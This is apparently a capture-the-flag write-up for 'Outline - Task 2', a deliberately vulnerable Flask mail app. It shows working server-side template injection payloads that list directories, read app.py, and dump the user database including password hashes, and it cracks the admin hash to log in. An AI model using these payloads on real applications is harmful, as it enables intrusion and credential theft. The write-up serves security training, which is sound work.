# Outline - Task 2

---

## Challenge Description 
Oh look its a vulnerable flask app! There are 2 flags hidden here. Good luck!

Task 2: /flag seems to have an error... Try accessing as one of the other users!

`nc c2.lagncrash.com 8002`

---

## Challenge Solution
Firstly, I used the command given to netcat into the server and then accessed the link.
```
[spawner] Spinning up new instance of:
[spawner]     Outline
[spawner]
[spawner] Access your challenge at:
[spawner]     http://c2.lagncrash.com:12768/
[spawner]
[spawner] ------------------------- NOTE --------------------------
[spawner] Hit [Enter] to destroy your challenge instance once done!
```

After accessing the link, I registered for an account and logged in to see this webpage.

![Screenshot 2022-03-27 170954](https://user-images.githubusercontent.com/101789488/160274756-431c5ee3-b326-4da8-b1be-206e6b3a8696.png)

If we try to access `/flag`, we will be redirected to a page with the following:
```
You are not allowed to view this page
```


From the challenge `Outline - Task 1`, we know that the page is vulnerable to [Server Side Template Injection (SSTI)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection). To confirm it, I used the following payload:
```
{{7*7}}
```
![Screenshot 2022-03-27 180732](https://user-images.githubusercontent.com/101789488/160276571-ab85f3c0-f66e-4a1a-95e7-e6b8175d85eb.png)

The following result proved that the page was vulnerable to SSTI.
```
From: To: Subject: 49
```

From there, I tried listing the directories available using the following payload:
```
{{url_for.__globals__.os.__dict__.listdir('./')}}
```

This was the result that I got:
```
From: To: Subject: ['User.py', 'requirements.txt', 'Mail.py', 'templates', 'storage.db.bak', 'storage.db.dir', 'static', 'storage.db.dat', 'app.py', '__pycache__']
```

At this point, I just went through each of the files to see if I can find the flag. To display the contents of each file, I used the following payload:
```
{{url_for.__globals__.__builtins__.open('app.py').read()}} 
```

After going through the different files, `app.py` displayed some information including the flag, a username 'bigboiadmin', and a password '2548dac1cb1bc28328c7f92cab9cf68ebf3d15a4514268a95f9b34619b456350' that looks hashed.
```
From: To: Subject: from flask import Flask, Response, render_template, request, redirect, url_for, session, send_from_directory, render_template_string import shelve import hashlib from User import User from Mail import Mail app = Flask(__name__, static_url_path='',static_folder='static') app.secret_key = "LNC2022{s1mpl3_fl4sk_s3rv3r_s1d3_t3mpl4t3_1nj3c10n}" @app.route('/', methods=['GET']) def home(): return render_template("home.html") @app.route('/register', methods=['GET','POST']) def register(): if request.method == 'GET': return render_template("register.html") elif request.method == 'POST': username = request.form['username'] password = sha256(request.form['password']) db = shelve.open('storage.db', 'w') users = db['users'] user = User(username, password) users[username] = user.asdict() db['users'] = users return redirect(url_for("home")) @app.route('/login', methods=['POST']) def login(): loggedin = False username = request.form['username'] password = sha256(request.form['password']) db = shelve.open('storage.db', 'r') users = db['users'] try: user = users[username] print(user['password'], password) if user['password'] == password: loggedin = True print('2') else: print('3') pass except: print('4') pass if loggedin == True: session["username"] = user['username'] session["login"] = user['id'] return redirect(url_for('mail')) else: response = Response(400) response.data = "Authentication failed" return response @app.route('/mail', methods=['GET', 'POST']) def mail(): if request.method == 'GET': return render_template("mail.html") elif request.method == 'POST': sender = request.form['sender'] receiver = request.form['receiver'] subject = request.form['subject'] body = request.form['body'] mail = Mail(sender,receiver,subject,body) id = mail.get_id() db = shelve.open('storage.db', 'w') mail_dict = db['mail'] mail_dict[id] = mail db['mail'] = mail_dict return render_template("sent.html", id=id) @app.route('/emails/<mailid>', methods=['GET']) def emails(mailid): db = shelve.open('storage.db', 'r') users = db['users'] mail_dict = db['mail'] mail = mail_dict[mailid] db.close() html = f'From: {mail.get_sender()} \ To: {mail.get_receiver()} \ Subject: {mail.get_subject()} \ {mail.get_body()}' return render_template_string(html,users=users) @app.route('/flag', methods=['GET']) def flag(): db = shelve.open('storage.db', 'r') users = db['users'] if session["username"] == "bigboiadmin" and session['login'] == users['bigboiadmin']['id']: response = Response(200) response.data = "LNC2022{n0t_4s_s1mpl3_fl4sk_s3rv3r_s1d3_t3mpl4t3_1nj3c10n}" else: response = Response(400) response.data = "You are not allowed to view this page" return response def sha256(hash_string): sha_signature = \ hashlib.sha256((hash_string).encode()).hexdigest() return sha_signature if __name__ == "__main__": db = shelve.open('storage.db', 'c') db['users'] = {"bigboiadmin":{'id':'4SAW8NH0I37CIE13MVC1Q1CL42N6PTFGECIQKS3Y0U8N8CEP', 'username': 'bigboiadmin', 'password': '2548dac1cb1bc28328c7f92cab9cf68ebf3d15a4514268a95f9b34619b456350'}} db['mail'] = {} db.close() app.run()
```

![Screenshot 2022-03-27 174914](https://user-images.githubusercontent.com/101789488/160276682-0579b8b0-37c1-4428-a694-265191590786.png)

From here, I already got the flag, but I would assume that the intended way of solving this challenge would be to login as the admin and access `/flag`. To obtain the user information, use this payload:
```
{{users.items()}}
```

This will be the result obtained:
```
From: To: Subject: dict_items([('bigboiadmin', {'id': '4SAW8NH0I37CIE13MVC1Q1CL42N6PTFGECIQKS3Y0U8N8CEP', 'username': 'bigboiadmin', 'password': '2548dac1cb1bc28328c7f92cab9cf68ebf3d15a4514268a95f9b34619b456350'}), ('gabeseet@gmail.com', {'id': 'J9I3J0BVPWQZGFB7P81D9UYBD7USA37KFTBVOTXHVFAF7RTP', 'username': 'gabeseet@gmail.com', 'password': 'b03ddf3ca2e714a6548e7495e2a03f5e824eaac9837cd7f159c67b90fb4b7342'}), ('', {'id': 'EEK6ZF7EPQSG5257EGWF3YJI2GQ8UO9GXHVWL52F1L7A0443', 'username': '', 'password': 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'}), ('test', {'id': 'OZILH75F4KU9HW9EFH26IDCNYMBI4DT1O8X6W3OW3EGMEYZC', 'username': 'test', 'password': '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08'})])
```

![Screenshot 2022-03-27 182532](https://user-images.githubusercontent.com/101789488/160277173-a6b6effc-3341-4677-994e-c593870255ba.png)

Using an [online hash cracker](https://crackstation.net/), we can get the password of the account 'bigboiadmin'. The following are the account credentials:
```
Username: bigboiadmin
Password: b1g5h0t$
```

If you login with the obtained credentials and navigate to `/flag`, you will be given the flag.
```
LNC2022{n0t_4s_s1mpl3_fl4sk_s3rv3r_s1d3_t3mpl4t3_1nj3c10n}
```